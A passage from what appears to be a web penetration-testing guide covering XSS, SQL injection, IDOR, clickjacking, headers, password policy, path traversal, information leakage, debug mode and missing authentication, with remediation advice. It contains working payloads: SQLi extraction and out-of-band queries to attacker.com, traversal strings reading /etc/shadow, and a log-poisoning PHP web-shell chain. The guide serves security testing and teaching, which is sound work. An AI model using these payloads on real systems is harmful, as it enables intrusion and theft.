[ ] Password field (check if reflected in error messages)
[ ] Email field (registration)
[ ] "Remember me" — name parameter
[ ] URL parameters in the login URL (?redirect=, ?error=, ?msg=)
[ ] HTTP referer header
[ ] User-Agent header (if reflected in error pages)
[ ] X-Forwarded-For header

Payload encoding bypasses:
[ ] HTML encoding: &lt;script&gt;
[ ] URL encoding: %3Cscript%3E
[ ] JavaScript encoding: \x3cscript\x3e
[ ] Mixed case: <ScRiPt>alert(1)</ScRiPt>
[ ] Double encoding: %253Cscript%253E
[ ] Null bytes: <scr\0ipt>
[ ] Event handlers: <img src=x onerror=alert(1)>
[ ] SVG vectors: <svg/onload=alert(1)>
```

---

### Impact

| Type | Impact |
|------|--------|
| Reflected XSS | Session hijacking via phishing, requires victim to click |
| Stored XSS | Mass session hijacking, admin account compromise, worm propagation |
| DOM XSS | Client-side credential theft, page defacement |
| All types | Cookie theft, keylogging, phishing overlays, CSRF token theft |

**CIA Triad Impact:**
- Confidentiality: **HIGH** — session cookies, keystrokes stolen
- Integrity: **HIGH** — page content modified, actions on user's behalf
- Availability: **MEDIUM** — can redirect or disrupt user experience

**CVSS Score:**
- Reflected: ~6.1 MEDIUM `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`
- Stored: ~8.8 HIGH `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`

---

### Remediation

- **Output encode all user-supplied data** before inserting into HTML: use `htmlspecialchars()` in PHP, `escape()` in Python, etc.
- Use a Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'`
- Never use `innerHTML`, `document.write()`, or `eval()` with user data — use `textContent` instead
- Implement input validation (whitelist expected characters)
- Use modern frameworks that auto-escape (React, Angular, Vue) — but understand their limitations
- Set `HttpOnly` flag on session cookies to prevent JS access to cookies

---

---

## 9. SQL Injection — All Types

### OWASP Mapping
**A03:2025 — Injection**
CWE-89: SQL Injection

---

### What It Is

SQL Injection encompasses multiple techniques — all exploiting the same root cause (untrusted input in SQL queries) but using different methods to extract data or execute commands when certain output is not directly visible.

---

### Types of SQL Injection

---

#### Type 1 — In-Band Error-Based SQLi

The database error message is returned directly in the HTTP response, revealing information about the database structure.

**How to Check:**

```sql
-- Inject into any parameter
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

-- MySQL error leaks version:
Duplicate entry '5.7.39-log1' for key 'group_key'
```

---

#### Type 2 — In-Band Union-Based SQLi

Uses the UNION SQL operator to append a second query and return its results alongside the original query output.

**How to Check:**

```sql
-- Step 1: Find number of columns
?id=1 ORDER BY 1--    (no error)
?id=1 ORDER BY 2--    (no error)
?id=1 ORDER BY 3--    (error → 2 columns confirmed)

-- Step 2: Find which columns are displayed
?id=-1 UNION SELECT 1,2--

-- Step 3: Extract data
?id=-1 UNION SELECT username,password FROM users--

-- Step 4: Get all databases
?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata--
```

---

#### Type 3 — Blind Boolean-Based SQLi

No error message and no data is returned directly. The attacker infers information by asking true/false questions and observing whether the page response changes.

**How to Check:**

```sql
-- True condition → normal page
?id=1 AND 1=1--

-- False condition → page changes (blank, different content)
?id=1 AND 1=2--

-- Extract data character by character
-- "Does the first character of the admin password equal 'a'?"
?id=1 AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- Automate with sqlmap
sqlmap -u "http://target.com/page?id=1" --technique=B --dump
```

---

#### Type 4 — Blind Time-Based SQLi

No visual difference in the response at all. The attacker uses time delays to infer information — if the database pauses for the specified seconds, the condition was true.

**How to Check:**

```sql
-- Test for time-based injection
?id=1; WAITFOR DELAY '0:0:5'--          (MSSQL — pauses 5 seconds if vulnerable)
?id=1 AND SLEEP(5)--                    (MySQL — pauses 5 seconds)
?id=1; SELECT pg_sleep(5)--             (PostgreSQL)

-- Extract data via timing
-- "If admin password starts with 'a', wait 5 seconds"
?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
```

**Automated exploitation:**

```bash
sqlmap -u "http://target.com/page?id=1" --technique=T --time-sec=5 --dump
```

---

#### Type 5 — Out-of-Band SQLi

Data is extracted through a different channel than the HTTP response — typically via DNS lookups or HTTP requests triggered from the database server to an attacker-controlled server. Useful when no output or timing differences are observable.

**How to Check:**

```sql
-- MySQL — triggers DNS lookup to attacker's domain
?id=1 AND LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\file'))

-- MSSQL — DNS/HTTP exfiltration
?id=1; EXEC xp_dirtree '\\attacker.com\test'

-- Oracle
?id=1 AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual) IS NOT NULL
```

Monitor the attacker server for incoming DNS lookups to confirm.

---

#### Type 6 — Second-Order (Stored) SQLi

Malicious input is stored safely in the database initially, but is later retrieved and used in an unsafe SQL query without sanitization, causing injection at that later point.

**How to Check:**

```
1. Register with username: admin'--
   (stored safely — properly escaped at registration)

2. Application later runs an UPDATE query using the stored username:
   UPDATE users SET password='newpass' WHERE username='admin'--'
   The -- comments out the rest, updating admin's password instead!

3. This is harder to detect — requires full application logic review
```

---

### SQLi Testing Checklist

```
Injection Points to Test:
[ ] GET parameters: ?id=1, ?category=shoes
[ ] POST body: username=, password=, search=
[ ] HTTP Headers: X-Forwarded-For, User-Agent, Referer, Cookie values
[ ] JSON body: {"id": "1'"}
[ ] XML body: <id>1'</id>
[ ] Path segments: /user/1'/profile

Databases and Their Specific Syntax:
[ ] MySQL: SLEEP(), GROUP_CONCAT(), information_schema
[ ] MSSQL: WAITFOR DELAY, xp_cmdshell, sysobjects
[ ] Oracle: dual table, UTL_HTTP, ALL_TABLES
[ ] PostgreSQL: pg_sleep(), generate_series(), pg_tables
[ ] SQLite: sqlite_master, randomblob()
```

---

### Impact

| Type | Impact |
|------|--------|
| Error-based | Database version, structure exposed immediately |
| Union-based | Full data extraction from all tables |
| Boolean blind | Data extraction (slower, character by character) |
| Time-based | Confirms injection when no other output exists |
| Out-of-band | Exfiltrates data through DNS/HTTP channels |
| Second-order | Bypasses input validation, modifies other users' data |

**CVSS Score: 9.8 CRITICAL** for all types where data is accessible
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

---

---

## 10. Insecure Direct Object Reference (IDOR) — All Types

### OWASP Mapping
**A01:2025 — Broken Access Control**
CWE-639: Authorization Bypass Through User-Controlled Key

---

### What It Is

IDOR occurs when an application uses a user-controllable value (such as a numeric ID, filename, or GUID) to directly access an object in storage or the database, without verifying that the requesting user is authorised to access that specific object.

---

### Types of IDOR

---

#### Type 1 — Numeric ID IDOR

**How to Check:**

```
Log in as User A (user_id=101)
Access: GET /api/profile?user_id=101  → Returns your own profile (expected)

Change to: GET /api/profile?user_id=102  → Returns another user's profile (IDOR!)

Test in Burp Repeater:
GET /api/invoice/1001  → Your invoice
GET /api/invoice/1002  → Another user's invoice
GET /api/invoice/1000  → Admin's invoice?
```

---

#### Type 2 — Filename-Based IDOR

**How to Check:**

```
Upload a file → URL: /uploads/user101_report.pdf

Try accessing: /uploads/user102_report.pdf
               /uploads/user1_report.pdf
               /uploads/admin_config.pdf

If other users' files are accessible → IDOR confirmed
```

---

#### Type 3 — GUID/UUID IDOR

UUIDs look complex but may still be predictable or leaked elsewhere:

**How to Check:**

```
Your profile: GET /api/user/550e8400-e29b-41d4-a716-446655440000

Check API responses for other UUIDs:
- Activity feeds, comments, shared content may expose other users' UUIDs
- Test those UUIDs on privileged endpoints:
  GET /api/user/3f6f08d4-c3b2-4a39-9c58-a7d1e5f6c3b0
```

---

#### Type 4 — IDOR via HTTP Request Parameter

**How to Check:**

```
POST /api/update-email HTTP/1.1
{"user_id": 101, "email": "attacker@evil.com"}

Change user_id:
POST /api/update-email HTTP/1.1
{"user_id": 102, "email": "attacker@evil.com"}

If user 102's email changes → IDOR with write access
```

---

#### Type 5 — Indirect IDOR (Reference via different attribute)

The object ID is not in the URL but in a POST body, hidden field, or cookie.

**How to Check:**

```
POST /view-order HTTP/1.1
Content-Type: application/x-www-form-urlencoded

order_ref=ORD-2024-8821

Change to: order_ref=ORD-2024-8820
           order_ref=ORD-2024-0001

If other orders are displayed → IDOR
```

---

#### Type 6 — IDOR in File Download Endpoints

**How to Check:**

```
GET /download?file_id=445
→ Downloads your_report.pdf

GET /download?file_id=444
→ Downloads someone_else_report.pdf (IDOR!)

GET /download?file_id=1
→ Downloads admin_backup.zip?? (critical IDOR!)
```

---

### IDOR Testing Methodology

```
Step 1: Create two test accounts (User A and User B)
Step 2: Log in as User A, perform all actions and note all IDs in responses
Step 3: Log in as User B, use User A's IDs on all endpoints
Step 4: Specifically test:
  - GET endpoints (read other users' data)
  - POST/PUT/PATCH endpoints (modify other users' data)
  - DELETE endpoints (delete other users' resources)
Step 5: Also test with no authentication at all (unauthenticated IDOR)
Step 6: Use Burp Intruder to enumerate numeric IDs:
  GET /api/user/§1§/data → iterate from 1 to 1000, look for 200 responses
```

---

### Impact

| Type | Impact |
|------|--------|
| Read IDOR | Exposure of other users' PII, documents, financial data |
| Write IDOR | Modifying other users' account data, email, password |
| Delete IDOR | Deleting other users' content or accounts |
| Admin IDOR | Accessing admin functions as regular user |

**CVSS Score: 6.5–9.1** depending on the sensitivity of exposed data
`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`

---

### Remediation

- Validate on every request that the authenticated user owns or has permission to access the requested object
- Never rely solely on the object ID — always check ownership server-side
- Use indirect references (map user-specific reference → actual object ID on server)
- Implement proper access control middleware applied to every protected route

---

---

## 11. Clickjacking

### OWASP Mapping
**A05:2025 — Security Misconfiguration**
CWE-1021: Improper Restriction of Rendered UI Layers

---

### What It Is

Clickjacking (also called UI Redress Attack) is a technique where an attacker loads the target website inside a transparent `<iframe>` and overlays it on top of a decoy page. The victim believes they are clicking on something harmless but are actually clicking on the hidden iframe — performing actions on the target site without their knowledge.

---

### Why It Is a Vulnerability

If the target website can be embedded in an iframe (i.e., the `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` header is missing), an attacker can trick authenticated users into performing actions like clicking "Confirm Transfer", "Delete Account", or "Grant Admin Permissions" invisibly.

---

### How to Check

**Step 1 — Check response headers**

```bash
curl -I https://target.com/login

# Look for these headers:
X-Frame-Options: DENY          ← Protected
X-Frame-Options: SAMEORIGIN    ← Protected (can only be framed by same domain)
Content-Security-Policy: frame-ancestors 'none'   ← Protected

# If NEITHER header is present → potentially vulnerable
```

**Step 2 — Create a proof-of-concept HTML page**

Save this as `clickjack_test.html` and open it in a browser:

```html
<!DOCTYPE html>
<html>
<head><title>Clickjacking Test</title></head>
<body>
  <h1>You Won a Prize! Click the button below!</h1>
  <button style="position:absolute; top:200px; left:50px; z-index:1;">
    CLAIM PRIZE
  </button>
  
  <!-- Target site loaded in transparent iframe -->
  <iframe src="https://target.com/login"
    style="position:absolute; top:0; left:0;
           width:100%; height:100%;
           opacity:0.1; z-index:2;">
  </iframe>
</body>
</html>
```

If the iframe loads the target site → **Clickjacking confirmed**.

**Step 3 — Test with Burp Suite**

Use the Clickbandit tool (Burp Pro):
```
Burp Suite → Burp Menu → Burp Clickbandit
Click "Copy Clickbandit to clipboard"
Paste in browser console on the target site
Record click sequence
```

**Step 4 — Check CSP header specifically**

```
Content-Security-Policy: frame-ancestors 'none'        ← Cannot be framed
Content-Security-Policy: frame-ancestors 'self'        ← Only same origin can frame
Content-Security-Policy: frame-ancestors 'none' https://trusted.com  ← Whitelist
```

---

### Real-World Attack Scenario

```
Scenario: Account Deletion via Clickjacking

Target site: http://target.com/account/delete (button on settings page)

1. Attacker creates decoy page: "Win an iPhone — Click here to claim!"
2. Decoy page has transparent iframe loaded over the claim button
3. The iframe shows target.com/settings with "Delete Account" button
4. Victim (who is logged in to target.com) clicks "Claim Prize"
5. Actually clicks "Delete Account" in the invisible iframe
6. Account is deleted — victim has no idea what happened
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Unauthorised actions | Victim performs actions without knowledge |
| Account changes | Password change, email change performed invisibly |
| Financial actions | Fund transfers, order confirmations |
| Permission grants | Granting OAuth permissions, admin access |
| Account deletion | Victim's account deleted by clicking on a "prize" |

**CVSS Score: ~6.1 MEDIUM**
`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

---

### Remediation

- Add `X-Frame-Options: DENY` header to all responses
- Implement CSP: `Content-Security-Policy: frame-ancestors 'none'`
- For pages that need to be embedded, use: `frame-ancestors 'self'`
- Implement frame-busting JavaScript as a secondary control:
  ```javascript
  if (top !== self) { top.location = self.location; }
  ```

---

---

## 12. Missing Security Headers

### OWASP Mapping
**A05:2025 — Security Misconfiguration**
CWE-16: Configuration

---

### What It Is

HTTP security headers are response headers that instruct browsers on how to handle the web application's content — restricting dangerous behaviours, preventing MIME sniffing, enabling XSS protection, and controlling what resources can be loaded. Missing or misconfigured headers leave the browser with no guidance on how to protect the user.

---

### How to Check

```bash
# Fetch headers from the login page
curl -I https://target.com/login

# Or use dedicated tools
nikto -h https://target.com
securityheaders.com (online tool)
```

---

### Critical Security Headers and What Happens When They Are Missing

---

#### Content-Security-Policy (CSP)

**Missing header impact:** Without CSP, the browser will load and execute any script, image, or frame from any source — enabling XSS attacks and data exfiltration.

```
Check:
curl -I https://target.com | grep -i "content-security-policy"

Should see:
Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self' data:; frame-ancestors 'none'

If missing: XSS attacks can freely execute, iframes can be injected
```

---

#### X-Frame-Options

**Missing header impact:** The site can be loaded inside an iframe — enabling clickjacking (see vulnerability #11).

```
Should see:
X-Frame-Options: DENY
or
X-Frame-Options: SAMEORIGIN

If missing: Clickjacking attacks are possible
```

---

#### X-Content-Type-Options

**Missing header impact:** Browsers may "sniff" the MIME type of a response and execute it differently than intended — a text file might be executed as JavaScript.

```
Should see:
X-Content-Type-Options: nosniff

If missing: MIME confusion attacks possible (e.g., upload a .jpg that is actually a .js file and have the browser execute it)
```

---

#### Strict-Transport-Security (HSTS)

**Missing header impact:** Browser may make initial HTTP requests before redirecting to HTTPS — allowing MITM attacks on first connection.

```
Should see:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

If missing: SSL stripping attacks possible on first connection
```

---

#### Referrer-Policy

**Missing header impact:** Sensitive URL paths or tokens in URLs may be leaked to external sites via the Referer header.

```
Should see:
Referrer-Policy: strict-origin-when-cross-origin
or
Referrer-Policy: no-referrer

If missing: Password reset tokens, session tokens in URLs may leak to third-party analytics or CDN providers
```

---

#### Permissions-Policy (formerly Feature-Policy)

**Missing header impact:** Allows pages to access powerful browser features (camera, microphone, geolocation) without restriction.

```
Should see:
Permissions-Policy: camera=(), microphone=(), geolocation=()

If missing: Malicious scripts (via XSS) can access hardware without additional prompts
```

---

#### Cache-Control for Sensitive Pages

**Missing header impact:** Browsers or proxy servers may cache login pages, dashboard data, or sensitive responses — accessible to the next user of a shared device.

```
Should see on login/account pages:
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache

If missing: Back button on a shared computer shows previous user's dashboard
```

---

### Security Headers Checklist

```
[ ] Content-Security-Policy        → Prevents XSS and data injection
[ ] X-Frame-Options                → Prevents clickjacking
[ ] X-Content-Type-Options: nosniff → Prevents MIME sniffing
[ ] Strict-Transport-Security      → Enforces HTTPS
[ ] Referrer-Policy                → Prevents URL leakage
[ ] Permissions-Policy             → Restricts browser feature access
[ ] Cache-Control                  → Prevents sensitive data caching
[ ] Set-Cookie: HttpOnly           → Prevents JS cookie access
[ ] Set-Cookie: Secure             → Cookie only sent over HTTPS
[ ] Set-Cookie: SameSite=Strict    → Prevents CSRF via cookie
```

---

### Impact

| Missing Header | Risk |
|----------------|------|
| CSP | XSS attacks fully effective, data exfiltration |
| X-Frame-Options | Clickjacking attacks possible |
| HSTS | SSL stripping on first connection |
| X-Content-Type-Options | MIME confusion attacks |
| Cache-Control | Sensitive data cached on shared devices |

**CVSS Score: 4.3–6.5 MEDIUM** depending on which headers are missing

---

---

## 13. Weak Password Policy

### OWASP Mapping
**A07:2025 — Identification and Authentication Failures**
CWE-521: Weak Password Requirements

---

### What It Is

A weak password policy is when an application allows users to set passwords that are easily guessable — short passwords, common words, no complexity requirements, or allowing known breached passwords. This dramatically reduces the effort required for brute force and credential stuffing attacks.

---

### How to Check

**Step 1 — Test minimum length**

```
Try registering with:
Password: a          → Accepted? Policy too weak
Password: ab         → Accepted?
Password: abc        → Accepted?
Password: 1234       → Accepted? (common 4-digit PIN)
Password: 12345678   → Accepted? (8 chars — borderline)

Minimum should be: 12+ characters
```

**Step 2 — Test complexity requirements**

```
Password: password      → Should be rejected (common word)
Password: password123   → Should be rejected (common pattern)
Password: Password1!    → Accepted? (barely passes most policies)
Password: aaaaaaaaaaa   → Should be rejected (all same character)
Password: 11111111      → Should be rejected (all numbers)
```

**Step 3 — Test for common/breached passwords**

```
Try OWASP's list of top 10,000 passwords:
Password: 123456        → Should be rejected
Password: qwerty        → Should be rejected
Password: iloveyou      → Should be rejected
Password: admin         → Should be rejected
Password: letmein       → Should be rejected
```

**Step 4 — Test username in password**

```
Username: johndoe
Password: johndoe       → Should be rejected
Password: johndoe123    → Should be rejected
Password: 123johndoe    → Should be rejected
```

**Step 5 — Test password change — old password reuse**

```
1. Change password to: NewPassword1!
2. Change it back to: OldPassword1!
   Should be rejected if password history is enforced
```

**Step 6 — Check if password is sent via GET parameter**

```
# In Burp, check if password appears in URL
GET /register?username=user&password=mypass123   ← Logs stored in server logs!
```

---

### Real-World Attack Scenario

```
Scenario: Dictionary Attack Enabled by Weak Policy

Application allows: 6+ character passwords, no complexity
User sets: Summer23 (common pattern, dictionary word + year)

Attacker runs:
hashcat -a 0 -m 0 hashes.txt rockyou.txt --rules=best64.rule

Password cracked in 3 seconds.
All accounts with dictionary-based passwords compromised.
```

---

### Impact

| Impact Area | Description |
|-------------|-------------|
| Easy brute force | Shorter passwords drastically reduce search space |
| Dictionary attacks | Common words/patterns cracked in seconds |
| Credential stuffing | Weak passwords reused across multiple services |
| Mass account compromise | If database is breached, all weak passwords exposed |

**CVSS Score: ~7.5 HIGH** (as an enabler for credential attacks)

---

### Remediation

- Minimum 12 characters (NIST SP 800-63B recommendation)
- Reject passwords from common password lists (HaveIBeenPwned API)
- Check against known breached passwords
- Allow all character types (spaces, special chars, Unicode)
- Do **not** require forced password rotations (NIST no longer recommends this)
- Enforce MFA as the primary second factor, stronger than password policy alone

---

---

## 14. Directory Listing and Path Traversal

### OWASP Mapping
**A01:2025 — Broken Access Control**
CWE-22: Improper Limitation of Pathname — Path Traversal | CWE-548: Directory Listing

---

### What It Is

**Directory listing** is when a web server exposes the contents of directories as a browsable file index when no index file (index.html) exists. **Path traversal** (directory traversal) is when user input is used to construct file paths and an attacker manipulates that input to escape the intended directory and access arbitrary files on the server.

---

### How to Check Directory Listing

**Step 1 — Browse known directories**

```
http://target.com/uploads/
http://target.com/backup/
http://target.com/images/
http://target.com/files/
http://target.com/static/
http://target.com/admin/
http://target.com/logs/
```

If a directory listing appears (showing files and folders) → **Directory listing enabled**.

**Step 2 — Use gobuster to find hidden directories**

```bash
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,old,zip,tar.gz \
  -t 50

# Look for interesting results like:
/backup/        (Status: 200) — directory listing
/config.bak     (Status: 200) — backup config file
/.git/          (Status: 200) — exposed git repository!
/database.sql   (Status: 200) — database dump!
```

---

### How to Check Path Traversal

**Step 1 — Identify file read parameters**

Look for parameters that reference files:

```
http://target.com/view?file=report.pdf
http://target.com/download?path=docs/manual.pdf
http://target.com/image?name=photo.jpg
http://target.com/include?page=about
```

**Step 2 — Inject traversal sequences**

```
# Unix/Linux targets
http://target.com/view?file=../../../../etc/passwd
http://target.com/view?file=../../../etc/shadow

# Windows targets
http://target.com/view?file=..\..\..\..\windows\win.ini
http://target.com/view?file=../../../../boot.ini

# URL encoded (bypass simple filters)
http://target.com/view?file=..%2F..%2F..%2Fetc%2Fpasswd
http://target.com/view?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double URL encoded
http://target.com/view?file=..%252f..%252f..%252fetc%252fpasswd

# Null byte (older PHP applications)
http://target.com/view?file=../../../../etc/passwd%00.jpg

# Absolute path
http://target.com/view?file=/etc/passwd
```

**Step 3 — Target sensitive files**

```
Linux:
/etc/passwd                     → Username list
/etc/shadow                     → Hashed passwords (needs root)
/etc/hosts                      → Internal network hostnames
/proc/self/environ              → Environment variables (may have secrets)
/var/www/html/config.php        → DB credentials
/var/log/apache2/access.log     → Log file injection
.ssh/authorized_keys            → SSH keys
.bash_history                   → Command history
/proc/self/fd/7                 → Web server log (via LFI)

Windows:
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

**Step 4 — Test with Burp Suite**

```
Send the file parameter request to Burp Repeater
Modify systematically:
file=report.pdf           → 200 OK (normal)
file=../report.pdf        → 200 or 404?
file=../../etc/passwd     → Contains /root/... entries? CONFIRMED
```

---

### Real-World Attack Scenario

```
Scenario: Path Traversal Leads to RCE

1. Attacker finds: GET /page?template=home.php
2. Tests: /page?template=../../../etc/passwd → returns /etc/passwd content (confirmed)
3. Attacker discovers the app includes log files:
   /page?template=../../../var/log/apache2/access.log

4. Access log contains the User-Agent header
5. Attacker sends request with PHP payload in User-Agent:
   User-Agent: <?php system($_GET['cmd']); ?>

6. Log now contains PHP code
7. Attacker requests: /page?template=../../../var/log/apache2/access.log&cmd=whoami
8. Command executes → Remote Code Execution achieved!
```

---

### Impact

| Issue | Impact |
|-------|--------|
| Directory listing | Exposes sensitive files, config, backups, source code |
| Path traversal (read) | Access to /etc/passwd, config files, source code |
| Path traversal (write) | Webshell upload, config file modification |
| LFI to RCE | Full server compromise via log poisoning or PHP wrappers |
| Git exposure | Full source code, secrets, history exposed via /.git/ |

**CVSS Score: 7.5–9.8** depending on what files are accessible

---

---

## 15. Sensitive Information Leakage in Source Code and Response Headers

### OWASP Mapping
**A02:2025 — Cryptographic Failures**
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

---

### What It Is

Applications often leak sensitive information in places developers forget to check — HTML page source code, JavaScript files, HTTP response headers, and API responses. This can expose internal infrastructure details, API keys, credentials, version numbers, and developer comments that help attackers build a clearer picture of the system.

---

### How to Check

**Step 1 — Review page source code**

Press `Ctrl+U` or right-click → View Page Source, then look for:

```html
<!-- Developer comments -->
<!-- TODO: Remove debug mode before production -->
<!-- DB: mysql://admin:password123@localhost:3306/users -->
<!-- Admin panel: /secret-admin-panel-2024 -->

<!-- Hardcoded credentials -->
<script>
  var apiKey = "AIzaSyB3x7m9...";       // Google API key
  var dbPassword = "SuperSecret123";      // NEVER DO THIS
  var adminToken = "Bearer eyJ0eXAi..."; // JWT hardcoded
</script>

<!-- Internal paths exposed -->
<form action="/internal/api/v2/process_login">
<script src="/internal-tools/debug/logger.js">
```

**Step 2 — Examine JavaScript files**

```bash
# Download and search all JS files for secrets
curl https://target.com/app.js | grep -iE "api_key|apikey|secret|password|token|auth|credential"

# Tools for automated JS secret finding
trufflehog filesystem /path/to/downloaded/js/files
```

**Step 3 — Inspect HTTP response headers for version disclosure**

```bash
curl -I https://target.com/login

# Dangerous headers to look for:
Server: Apache/2.2.34     ← Specific version (EOL, known CVEs)
X-Powered-By: PHP/7.2.5  ← PHP version (EOL)
X-AspNet-Version: 4.0    ← ASP.NET version
X-Generator: WordPress 5.8.1  ← CMS version

# Also check for environment info
X-Environment: production
X-Debug: true
X-Internal-IP: 192.168.1.50    ← Internal IP disclosed!
```

**Step 4 — Check cookies for information leakage**

```
Set-Cookie: user_role=admin     ← Role exposed in cookie
Set-Cookie: db_host=mysql-prod-01.internal  ← Internal hostname
Set-Cookie: ASPSESSIONID=...    ← Reveals ASP.NET framework
Set-Cookie: PHPSESSID=...       ← Reveals PHP
Set-Cookie: JSESSIONID=...      ← Reveals Java/JSP
```

**Step 5 — Check API responses for over-exposure**

```
GET /api/user/profile
Response:
{
  "id": 101,
  "username": "john",
  "email": "john@example.com",
  "password_hash": "$2y$10$...",    ← Never return this!
  "is_admin": false,
  "internal_user_id": "USR-MYSQL-2847",
  "last_login_ip": "192.168.1.100", ← Internal IP leaked
  "api_key": "sk-prod-AbCdEf..."    ← Secret API key in response!
}
```

**Step 6 — Check .git, .svn, .env exposure**

```bash
# Test for exposed source control and environment files
curl https://target.com/.git/config
curl https://target.com/.env
curl https://target.com/.env.production
curl https://target.com/config.php.bak
curl https://target.com/web.config
curl https://target.com/phpinfo.php

# .env file may contain:
DB_PASSWORD=supersecretpassword
AWS_SECRET_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
STRIPE_SECRET_KEY=sk_live_...
```

---

### Impact

| Leakage Type | Impact |
|--------------|--------|
| Version numbers | Attacker looks up specific CVEs for that version |
| Internal IPs | Network mapping, pivot attack planning |
| API keys | Full API access, billing fraud, data exfiltration |
| DB credentials | Direct database access |
| Admin endpoints | Targeted attacks on hidden admin panels |
| Source code via .git | Full application logic, additional secrets |

**CVSS Score: 5.3–9.8** depending on what is exposed

---

---

## 16. Improper Error Handling and Debug Mode Enabled

### OWASP Mapping
**A05:2025 — Security Misconfiguration**
CWE-209: Generation of Error Message Containing Sensitive Information

---

### What It Is

When an application is deployed in debug mode or does not have proper error handling, it can expose detailed technical information in error responses — including stack traces, database query details, framework version numbers, internal file paths, and source code snippets. This information dramatically accelerates an attacker's reconnaissance.

---

### How to Check

**Step 1 — Trigger errors deliberately**

On a login form or any input field, submit unexpected input:

```
# Trigger SQL errors
Username: '
Username: 1=1
Username: 1/0
Username: <script>

# Trigger type errors
Username: [1,2,3]    (array instead of string)
Username: {"key":"value"}  (JSON object)
Username: AAAAAAAAAAAAAAAAAAAAAA... (very long string — buffer overflow)
Username: ../../../  (path traversal in username)

# Trigger parsing errors
Username: %00  (null byte)
Username: \x00
Username: ${7*7}   (template injection test)
```

**Step 2 — Look for stack traces in responses**

Vulnerable response example (PHP):

```
Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation:
1064 You have an error in your SQL syntax; check the manual that corresponds to your
MySQL server version for the right syntax to use near ''admin''' at line 1
in /var/www/html/app/models/UserModel.php:47
Stack trace:
#0 /var/www/html/app/models/UserModel.php(47): PDOStatement->execute()
#1 /var/www/html/app/controllers/AuthController.php(89): UserModel->findUser()
#2 /var/www/html/index.php(24): AuthController->login()
```

This exposes: database type (MySQL), server file paths, class names, line numbers.

**Step 3 — Look for Django/Laravel/Rails debug pages**

```
Django DEBUG=True → Returns full debug page with:
- Full exception traceback
- Local variables at each frame
- HTTP request details (including all headers and POST data!)
- Settings file excerpt (database, cache, secret key)
- SQL queries executed
```

**Step 4 — Check phpinfo() exposure**

```bash
curl https://target.com/phpinfo.php
curl https://target.com/info.php
curl https://target.com/test.php
curl https://target.com/php_info.php
```

phpinfo() exposes: PHP version, all loaded extensions, server configuration, environment variables (including credentials!), server path information.

**Step 5 — Access common debug endpoints**

```
/debug
/console        ← Django/Rails interactive console
/actuator       ← Spring Boot metrics, env, beans endpoints
/actuator/env   ← All environment variables including secrets!
/actuator/heapdump  ← Full memory dump
/trace
/_profiler      ← Symfony profiler
/telescope      ← Laravel Telescope
```

---

### Real-World Attack Scenario

```
Scenario: Django Debug Mode Exposes Secret Key

Application deployed with DEBUG=True (forgot to change for production)

Attacker submits: username=admin'

Django returns full debug page including:
  DATABASES = {
    'default': {
      'ENGINE': 'django.db.backends.mysql',
      'HOST': 'prod-db-01.internal',
      'USER': 'dbadmin',
      'PASSWORD': 'Pr0d_DB_P@ss!',
      'NAME': 'users_prod'
    }
  }
  SECRET_KEY = 'django-insecure-xxx...'

Attacker connects directly to DB and dumps all user data.
Attacker uses SECRET_KEY to forge session tokens.
```

---

### Impact

| Information Leaked | Impact |
|-------------------|--------|
| Stack trace + file paths | Internal directory structure mapped |
| Database errors | Database type confirmed, SQLi refined |
| Secret key / API keys | Full account takeover, data access |
| DB credentials in debug | Direct database access |
| Framework version | Attacker targets known CVEs |
| Console/actuator exposure | Interactive command execution |

**CVSS Score: 5.3–9.8** depending on what is revealed

---

### Remediation

- Disable debug mode in all production environments
- Configure a generic error page (500 page) that shows no technical details
- Log detailed errors server-side only — never in HTTP responses
- Remove all debug endpoints, phpinfo files, and profiler routes before deployment
- Review deployment checklist before going live (DEBUG=False, verbose errors off)

---

---

## 17. No Authentication on Sensitive Endpoints

### OWASP Mapping
**A07:2025 — Identification and Authentication Failures**
CWE-306: Missing Authentication for Critical Function

---

### What It Is

Some API endpoints, admin panels, or functions that perform sensitive operations (creating users, exporting data, resetting passwords, executing commands) are accessible without requiring any authentication. This is often caused by developers forgetting to apply authentication middleware to certain routes, or assuming that "no one will know the URL."

---

### How to Check

**Step 1 — Spider the application**

```bash
# Use Burp's spider/crawler while authenticated
Burp Suite → Target → Site Map → Right-click → Spider from here

# Use OWASP ZAP's active scanner
zap-cli quick-scan --start-options "-config api.disablekey=true" http://target.com

# Use hakrawler for JS link extraction
echo "https://target.com" | hakrawler -depth 3 -js -subs
```

**Step 2 — Test all discovered endpoints without authentication**

For every endpoint discovered while authenticated, test it without the session cookie:

```bash
# While authenticated, note all API calls in Burp HTTP History
# Then replay them with authentication removed:

# Remove Cookie header entirely
curl -X GET https://target.com/api/admin/users

# Remove Authorization header
curl -X GET https://target.com/api/export/all-data

# Change role in JWT but remove signature verification
```

